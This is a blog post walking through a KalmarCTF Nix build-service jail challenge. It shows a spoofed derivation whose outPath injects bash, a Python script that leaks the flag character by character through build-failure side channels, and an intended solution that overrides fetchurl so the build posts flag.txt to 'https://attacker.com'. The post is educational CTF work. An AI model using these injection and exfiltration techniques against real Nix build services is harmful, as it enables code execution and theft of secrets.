+<h3 id="what-is-a-derivation">What is a Derivation?</h3>
+<p>Depends on who you ask.
+Luckily for us, <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1250-L1282"><code>lib.isDerivation</code></a> considers any attrset a derivation
+as long as it has a <code>type</code> attribute with value <code>&quot;derivation&quot;</code>:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">isDerivation </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">value</span><span style="color:#5fb3b3;">: </span><span style="color:#f99157;">value</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">type </span><span style="color:#5fb3b3;">or </span><span style="color:#f99157;">null </span><span style="color:#5fb3b3;">== &quot;</span><span style="color:#99c794;">derivation</span><span style="color:#5fb3b3;">&quot;;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Therefore, the first step in the solution is to pass that check in <code>default.nix</code>,
+which can be done by simply providing <code>{ type = &quot;derivation&quot;; }</code> as input.
+Great, the derivation now builds successfully!</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ ./chall.sh
+</span><span>this derivation will be built:
+</span><span>  /nix/store/8m344nl285pcz79xyb1y4ngdxq8dsdcz-nixjail-0.0.1.drv
+</span><span>building &#39;/nix/store/8m344nl285pcz79xyb1y4ngdxq8dsdcz-nixjail-0.0.1.drv&#39;...
+</span><span>(hidden for brevity)
+</span><span>/nix/store/gwmr71zbzbaa3c1mmxz6ly2fpi1q7svr-nixjail-0.0.1
+</span></code></pre>
+<p>Okay, but really, what <em>is</em> a derivation?</p>
+<p>If you have ever contributed to <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs">nixpkgs</a> before, you might be used to
+<code>stdenv.mkDerivation</code>, or even language specific builders like <code>rustPlatform.buildRustPackage</code>.
+However, all of these derive from the <a rel="noopener nofollow noreferrer" target="_blank" href="https://nix.dev/manual/nix/2.24/language/derivations.html"><code>derivation</code> builtin</a>, a function that
+takes in an attrset and returns derivation (which, coincidently, is also an attrset).</p>
+<p>In its most basic form, a derivation takes a name, a system type (e.g., <code>x86_64-linux</code>)
+and a builder (i.e., a program to run when the derivation is build).
+There are other optional attributes you can set, but these are the minimum requirements.</p>
+<p>Let’s fire up <code>nix repl</code> and see what happens when we evaluate a sample derivation.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>Nix 2.24.12
+</span><span>Type :? for help.
+</span><span>nix-repl&gt; my-drv = derivation { name = &quot;test&quot;; system = &quot;x86_64-linux&quot;; builder = &quot;/bin/sh&quot;; }
+</span><span>
+</span><span>nix-repl&gt; my-drv
+</span><span>«derivation /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv»
+</span><span>
+</span><span>nix-repl&gt; my-drv.type
+</span><span>&quot;derivation&quot;
+</span><span>
+</span><span>nix-repl&gt; :p (my-drv // { type = &quot;&quot;; })
+</span><span>{
+</span><span>  all = [
+</span><span>    «derivation /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv»
+</span><span>  ];
+</span><span>  builder = &quot;/bin/sh&quot;;
+</span><span>  drvAttrs = {
+</span><span>    builder = &quot;/bin/sh&quot;;
+</span><span>    name = &quot;test&quot;;
+</span><span>    system = &quot;x86_64-linux&quot;;
+</span><span>  };
+</span><span>  drvPath = &quot;/nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv&quot;;
+</span><span>  name = &quot;test&quot;;
+</span><span>  out = «repeated»;
+</span><span>  outPath = &quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;;
+</span><span>  outputName = &quot;out&quot;;
+</span><span>  system = &quot;x86_64-linux&quot;;
+</span><span>  type = &quot;&quot;;
+</span><span>}
+</span></code></pre>
+<p>Note: the repl does not print the contents of the underlying attrset of a derivation,
+but if we trick it by changing the <code>type</code> to something else, we can peek into the
+“internals” of a derivation.</p>
+<p>We can notice that the resulting derivation contains most of the information we would expect
+given what we provided, with some recursive attributes along the way (e.g., you can do <code>my-drv.out.out.out</code>
+until infinity).
+Most notably, it <em>created</em> a file in my Nix store, describing the derivation:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ cat /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv
+</span><span>Derive([(&quot;out&quot;,&quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;,&quot;&quot;,&quot;&quot;)],[],[],&quot;x86_64-linux&quot;,&quot;/bin/sh&quot;,[],[(&quot;builder&quot;,&quot;/bin/sh&quot;),(&quot;name&quot;,&quot;test&quot;),(&quot;out&quot;,&quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;),(&quot;system&quot;,&quot;x86_64-linux&quot;)])
+</span></code></pre>
+<p>It has, however, <em>not</em> built it, since we have only evaluated it:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ ls /nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test
+</span><span>&quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;: No such file or directory (os error 2)
+</span></code></pre>
+<p>This behaviour was something I could not reproduce without the <code>derivation</code> builtin.
+My initial idea was to create a derivation by hand, without using any builtins,
+and then have that, <em>somehow</em>, affect the build and leak the flag,
+but I did not find a way for Nix to “regenerate” the <code>.drv</code> file from <code>drvAttrs</code>,
+even if the hash matched the expected value.</p>
+<h3 id="tostring-ing">toString-ing</h3>
+<p>Remember the change to the challenge that added a <code>buildPhase</code> to the derivation?</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">buildPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">    runHook preBuild
+</span><span style="color:#99c794;">    # TODO: Enable building
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">    # &quot;</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">user-drv</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">/bin/build&quot;
+</span></mark><span style="color:#99c794;">    runHook postBuild
+</span><span style="color:#99c794;">  </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Intuitively, we know that converting a derivation to a string will result in the
+store path, but how does Nix know to do that?
+From what we have seen about the derivation, there is only one attribute containing
+the store path, <code>outPath</code>, so it <em>must</em> be that one, but how does Nix <em>know</em>?
+Well, turns out it doesn’t, it just converts any attrset containing <code>outPath</code> to
+the value of that attribute, recursively.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>nix-repl&gt; toString my-drv
+</span><span>&quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;
+</span><span>
+</span><span>nix-repl&gt; toString (my-drv // { type = &quot;&quot;; })
+</span><span>&quot;/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test&quot;
+</span><span>
+</span><span>nix-repl&gt; toString { }
+</span><span>
+</span><span>       error: cannot coerce a set to a string: { }
+</span><span>
+</span><span>nix-repl&gt; toString { type = &quot;derivation&quot;; }
+</span><span>
+</span><span>       error: cannot coerce a set to a string: { type = &quot;derivation&quot;; }
+</span><span>
+</span><span>nix-repl&gt; toString { type = &quot;derivation&quot;; outPath = &quot;foo&quot;; }
+</span><span>&quot;foo&quot;
+</span><span>
+</span><span>nix-repl&gt; toString { outPath = &quot;foo&quot;; }
+</span><span>&quot;foo&quot;
+</span><span>
+</span><span>nix-repl&gt; toString { outPath = {}; }
+</span><span>
+</span><span>       error: cannot coerce a set to a string: { }
+</span><span>
+</span><span>nix-repl&gt; toString { outPath = 1; }
+</span><span>&quot;1&quot;
+</span><span>
+</span><span>nix-repl&gt; toString { outPath = { outPath = &quot;bar&quot;; }; }
+</span><span>&quot;bar&quot;
+</span></code></pre>
+<p>This is actually <a rel="noopener nofollow noreferrer" target="_blank" href="https://nix.dev/manual/nix/2.24/language/builtins#builtins-toString">documented under the <code>toString</code> builtin</a>, I just had
+never stumbled upon it before.</p>
+<p>Using this, it is possible to execute arbitrary bash code during the build process,
+since the contents of <code>outPath</code> are not escaped:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">type </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">derivation</span><span style="color:#5fb3b3;">&quot;;
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#bb80b3;">outPath </span><span style="color:#5fb3b3;">= &quot;\n</span><span style="color:#99c794;"> cat </span><span style="color:#5fb3b3;">${</span><span style="color:#99c794;">./flag.txt</span><span style="color:#5fb3b3;">} \n</span><span style="color:#99c794;"> #</span><span style="color:#5fb3b3;">&quot;;
+</span></mark><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>If we build the derivation, we can see that we are indeed executing code:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ ./chall.sh
+</span><span>this derivation will be built:
+</span><span>  /nix/store/ymcc7hmyvpi436v8323fqpxwsjh1m1l6-nixjail-0.0.1.drv
+</span><span>building &#39;/nix/store/ymcc7hmyvpi436v8323fqpxwsjh1m1l6-nixjail-0.0.1.drv&#39;...
+</span><span>Running phase: patchPhase
+</span><span>Running phase: updateAutotoolsGnuConfigScriptsPhase
+</span><span>Running phase: configurePhase
+</span><span>no configure script, doing nothing
+</span><span>Running phase: buildPhase
+</span><mark style="background-color:#3e4044;"><span>kalmar{this-is-the-right-one}
+</span></mark><span>Running phase: installPhase
+</span><span>Running phase: fixupPhase
+</span><span>shrinking RPATHs of ELF executables and libraries in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
+</span><span>checking for references to /build/ in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1...
+</span><span>patching script interpreter paths in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
+</span><span>/nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
+</span></code></pre>
+<p>However, recall that we can only see the last line of the log, so this just by itself won’t
+give us the flag.</p>
+<h2 id="side-channels">Side-channels</h2>
+<p>This is where side-channels come in!
+Using the code-execution capabilities we just acquired, we can conditionally fail
+the build, which is very much visible from the web app.
+One example of this, is failing if the contents of <code>flag.txt</code> do not start with
+a given string:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">type </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">derivation</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#bb80b3;">outPath </span><span style="color:#5fb3b3;">= &quot;\n</span><span style="color:#99c794;">[[ $(cat </span><span style="color:#5fb3b3;">${</span><span style="color:#99c794;">./flag.txt</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">) == kalmar{* ]]</span><span style="color:#5fb3b3;">\n</span><span style="color:#99c794;"> #</span><span style="color:#5fb3b3;">&quot;;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>This piece of bash code will succeed if the flag starts with <code>kalmar{</code>, allowing
+us to retrieve the flag one character at a time with a simple Python script:</p>
+<pre data-lang="py" style="background-color:#2b2c2f;color:#cccece;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#c594c5;">from </span><span>requests_toolbelt </span><span style="color:#c594c5;">import </span><span>sessions
+</span><span style="color:#c594c5;">import </span><span>string
+</span><span>
+</span><span>BASE_URL </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">http://localhost:8080/</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#5f6364;"># change to remote
+</span><span>s </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">sessions</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">BaseUrlSession</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">base_url</span><span style="color:#5fb3b3;">=</span><span>BASE_URL</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>
+</span><span style="color:#c594c5;">def </span><span style="color:#6699cc;">build_payload</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">flag_prefix</span><span style="color:#5fb3b3;">):
+</span><span>    </span><span style="color:#c594c5;">return f</span><span style="color:#5fb3b3;">&quot;&quot;&quot;
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">{{
+</span><span style="color:#99c794;">        type = &quot;derivation&quot;;
+</span><span style="color:#99c794;">        outPath = &quot;</span><span style="color:#5fb3b3;">\n</span><span style="color:#99c794;">[[ $(cat $</span><span style="color:#5fb3b3;">{{</span><span style="color:#99c794;">./flag.txt</span><span style="color:#5fb3b3;">}}</span><span style="color:#99c794;">) == </span><span style="color:#5fb3b3;">{</span><span>flag_prefix</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">* ]]</span><span style="color:#5fb3b3;">\n</span><span style="color:#99c794;"> #&quot;;
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">}}
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&quot;&quot;&quot;
+</span><span>
+</span><span>
+</span><span style="color:#c594c5;">def </span><span style="color:#6699cc;">test_prefix</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">flag_prefix</span><span style="color:#5fb3b3;">):
+</span><span>    payload </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">build_payload</span><span style="color:#5fb3b3;">(</span><span style="color:#6699cc;">flag_prefix</span><span style="color:#5fb3b3;">)
+</span><span>    res </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">s</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">post</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">/</span><span style="color:#5fb3b3;">&quot;, </span><span style="color:#f99157;">data</span><span style="color:#5fb3b3;">={&quot;</span><span style="color:#99c794;">user_input</span><span style="color:#5fb3b3;">&quot;: </span><span style="color:#6699cc;">payload</span><span style="color:#5fb3b3;">})
+</span><span>    </span><span style="color:#c594c5;">return </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">cannot create symlink</span><span style="color:#5fb3b3;">&quot; in </span><span>res</span><span style="color:#5fb3b3;">.</span><span>text
+</span><span>
+</span><span>
+</span><span>alphabet </span><span style="color:#5fb3b3;">= </span><span>string</span><span style="color:#5fb3b3;">.</span><span>ascii_letters </span><span style="color:#5fb3b3;">+ </span><span>string</span><span style="color:#5fb3b3;">.</span><span>digits </span><span style="color:#5fb3b3;">+ &quot;{}</span><span style="color:#99c794;">-_</span><span style="color:#5fb3b3;">&quot;
+</span><span>flag </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">kalmar{</span><span style="color:#5fb3b3;">&quot;
+</span><span style="color:#c594c5;">while </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">}</span><span style="color:#5fb3b3;">&quot; not in </span><span>flag</span><span style="color:#5fb3b3;">:
+</span><span>    </span><span style="color:#c594c5;">for </span><span>letter </span><span style="color:#c594c5;">in </span><span>alphabet</span><span style="color:#5fb3b3;">:
+</span><span>        </span><span style="color:#c594c5;">if </span><span style="color:#6699cc;">test_prefix</span><span style="color:#5fb3b3;">(</span><span style="color:#6699cc;">flag </span><span style="color:#5fb3b3;">+ </span><span style="color:#6699cc;">letter</span><span style="color:#5fb3b3;">):
+</span><span>            flag </span><span style="color:#5fb3b3;">+= </span><span>letter
+</span><span>            </span><span style="color:#6699cc;">print</span><span style="color:#5fb3b3;">(</span><span style="color:#6699cc;">flag</span><span style="color:#5fb3b3;">)
+</span><span>            </span><span style="color:#c594c5;">break
+</span></code></pre>
+<p>Note: an interesting part of the web app is that it doesn’t pass
+<code>--no-out-link</code> to <code>nix-build</code>, which makes the build always fail since
+it does not have permissions to write the <code>result</code> symlink:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>error: filesystem error: cannot create symlink: Permission denied [/nix/store/gwmr71zbzbaa3c1mmxz6ly2fpi1q7svr-nixjail-0.0.1] [/result.tmp-628-1405809681]
+</span></code></pre>
+<p>This is, however, still enough to differentiate between the two cases, since a build
+failure returns something like:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>       For full logs, run &#39;nix log /nix/store/dnlaqczp0yrff6nvgqnvykbyfjg566qd-nixjail-0.0.1.drv&#39;.
+</span></code></pre>
+<p>After waiting about 20 minutes for the script to run (it was pretty slow, but we had time),
+we got the whole flag! 🎉</p>
+<h2 id="intended-solution">Intended Solution</h2>
+<p>After solving the challenge, I talked with the author <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@nrab">niko</a>, who
+showed me the intended solution, which is arguably even more interesting and
+actually takes advantage of <code>pkgs.hello</code> in <code>default.nix</code>, unlike my solution
+which could work without it by making a slight modification.
+More importantly, it works without the addition of the <code>buildPhase</code> nerf,
+that is, it works with only adding the derivation to <code>nativeBuildInputs</code>.</p>
+<p>Without further ado, this is the intended solution:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">type </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">derivation</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#bb80b3;">outputSpecified </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">; </span><span style="color:#5f6364;"># equals to true, since that is blocked by no-builtins.nix
+</span><span>  </span><span style="color:#bb80b3;">__toString </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">self</span><span style="color:#5fb3b3;">: (</span><span style="color:#f99157;">self</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">src</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">overrideAttrs </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#5f6364;"># force nix to re-download file
+</span><span>    </span><span style="color:#bb80b3;">outputHash </span><span style="color:#5fb3b3;">= &quot;&quot;;
+</span><span>    </span><span style="color:#bb80b3;">outputHashAlgo </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">sha256</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">urls </span><span style="color:#5fb3b3;">= [ &quot;</span><span style="color:#99c794;">https://attacker.com</span><span style="color:#5fb3b3;">&quot; ];
+</span><span>    </span><span style="color:#bb80b3;">curlOptsList </span><span style="color:#5fb3b3;">= [ &quot;</span><span style="color:#99c794;">-F</span><span style="color:#5fb3b3;">&quot; &quot;</span><span style="color:#99c794;">flag=@</span><span style="color:#5fb3b3;">${</span><span style="color:#99c794;">./flag.txt</span><span style="color:#5fb3b3;">}&quot; ];
+</span><span>  </span><span style="color:#5fb3b3;">});
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Let’s now figure out <em>why</em> and how this works.</p>
+<p>When a derivation is added to <code>nativeBuildInputs</code>, <code>mkDerivation</code> will
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/stdenv/generic/make-derivation.nix#L346">call <code>lib.getDev</code> on it</a> in order to get a store path suitable to
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/stdenv/generic/setup.sh#L819">add to <code>PATH</code></a>.</p>
+<p>Notably, <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1933-L1960"><code>lib.getDev</code></a> is simply an alias to <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1763-L1799"><code>lib.getOutput &quot;dev&quot;</code></a>,
+which are defined as:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">getOutput </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">output</span><span style="color:#5fb3b3;">: </span><span style="color:#f99157;">pkg</span><span style="color:#5fb3b3;">:
+</span><span>    </span><span style="color:#c594c5;">if </span><span style="color:#5fb3b3;">! </span><span style="color:#f99157;">pkg </span><span style="color:#5fb3b3;">? </span><span style="color:#f99157;">outputSpecified </span><span style="color:#5fb3b3;">|| ! </span><span style="color:#f99157;">pkg</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">outputSpecified
+</span><span>      </span><span style="color:#c594c5;">then </span><span style="color:#f99157;">pkg</span><span style="color:#5fb3b3;">.${</span><span style="color:#f99157;">output</span><span style="color:#5fb3b3;">} or </span><span style="color:#f99157;">pkg</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">out </span><span style="color:#5fb3b3;">or </span><span style="color:#f99157;">pkg
+</span><span>      </span><span style="color:#c594c5;">else </span><span style="color:#f99157;">pkg</span><span style="color:#5fb3b3;">;
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">getDev </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">getOutput </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">dev</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>To put it simply, <code>lib.getOutput</code> returns <code>pkg.${output}</code>
+if it exists, falling back to <code>pkg.out</code> and then to <code>pkg</code>.
+However, we can force it to always return <code>pkg</code> by setting
+<code>outputSpecified</code> to true in the attrset.</p>
+<p>So, by setting <code>outputSpecified</code> we force the contents of
+<code>outPath</code> to be added to <code>PATH</code> (since, as we’ve seen, <code>toString attrset</code>
+returns <code>outPath</code> if it exists).
+However, there is another way to control how an attrset is stringify-ed:
+by the <code>__toString</code> attribute, which is <a rel="noopener nofollow noreferrer" target="_blank" href="https://nix.dev/manual/nix/2.24/language/builtins#builtins-toString">also documented</a>.
+This attribute takes a function, which receives the attrset being
+stringify-ed (i.e., itself) and expects a string to be returned.</p>
+<p>This allows us to access the attributes in <code>pkgs.hello</code>, which conveniently
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/by-name/he/hello/package.nix#L16-L19">includes a call</a> to <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/nixos/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/build-support/fetchurl/default.nix"><code>fetchurl</code></a>.
+This is override-able through <code>overrideAttrs</code> to change the URL to one
+that we control and to include the flag in the request,
+which achieves the <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#investigating-attack-vectors">first attack vector</a> I mentioned earlier.</p>
+<p>Therefore, when the <code>nixjail</code> derivation is built, it triggers a
+request containing the flag. Neat!</p>
+<h2 id="final-remarks">Final Remarks</h2>
+<p>I’m really loving these Nix challenges in CTFs, since they teach me a lot
+about the inner workings of Nix, nixpkgs and NixOS.
+This time, I learnt a bit more about how mkDerivation works under the hood, refreshed
+my mind on the plain <code>derivation</code> builtin, and discovered new ways to change
+the output of <code>toString</code>.</p>
+<p>Big kudos to <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@nrab">niko</a> and <a rel="noopener nofollow noreferrer" target="_blank" href="https://www.kalmarunionen.dk/">Kalmarunionen</a> for putting out
+this awesome challenge and CTF!
+I’m hoping to have more Nix challs next year as well 👀</p>
+
+    </div>
+  </article>
+  <div></div>
+  <div class="disclaimer">
+    This post has been written by humans only, unless otherwise explicitly stated.<br>
+    Opinions are solely my own and do not reflect those of any employer, past, present, or future.<br>
+    Content licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a>.
+  </div>
+</div>
+
+
+    </main>
+    <footer>
+      <div class="container footer-sections">
+        <div class="footer-section">
+          <h2>Contact me</h2>
+          <ul>
+            
+              <li>
+                <span class="social-label">Email: </span>
+                <a
+                  href="mailto:parnian.lalii@gmail.com"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="mail-social-footer"
+                >
+                  parnian.lalii@gmail.com
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">Linkedin: </span>
+                <a
+                  href="www.linkedin.com&#x2F;in&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="Linkedin-social-footer"
+                >
+                  parnian lali
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">github: </span>
+                <a
+                  href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="github-social-footer"
+                >
+                  parnianlali
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h2>Site map</h2>
+          <ul>
+            <li><a href="https:&#x2F;&#x2F;parnianlali.github.io">Home</a></li>
+            <li><a href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">CV</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="copyright">
+        <div class="container">
+          <p class="copyright-text">&copy; 2025 Parnian Lali. Based on a template by <a href="https://github.com/diogotcorreia">Diogo Correia</a>.
+          </p>
+          
+        </div>
+      </div>
+    </footer>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    // 
+    const navbar = document.querySelector("nav");
+    const observer = new IntersectionObserver(entries => {
+      if (entries[0].boundingClientRect.y < 0) {
+        navbar.classList.add("navbar--sticky");
+      } else {
+        navbar.classList.remove("navbar--sticky");
+      }
+    });
+    observer.observe(document.querySelector("#navbar-trigger"));
+
+    const drawer = document.getElementById("navbar-drawer");
+    const drawerOpenBtn = document.getElementById("drawer-open");
+    const drawerCloseBtn = document.getElementById("drawer-close");
+
+    drawerOpenBtn.addEventListener("click", () => {
+      drawer.showModal();
+    });
+    document.querySelectorAll("#drawer-close, #navbar-drawer a").forEach(element => {
+      element.addEventListener("click", () => {
+        drawer.close();
+      });
+    });
+  });
+</script>
+    <script
+      async
+      defer
+      data-website-id="25c8aedf-a960-4b55-8c70-7bc4b2ad587b"
+      src="https://umami.diogotc.com/hellothere.js"
+      data-domains="diogotc.com,www.diogotc.com"
+    ></script>
+
+  </body>
+</html>
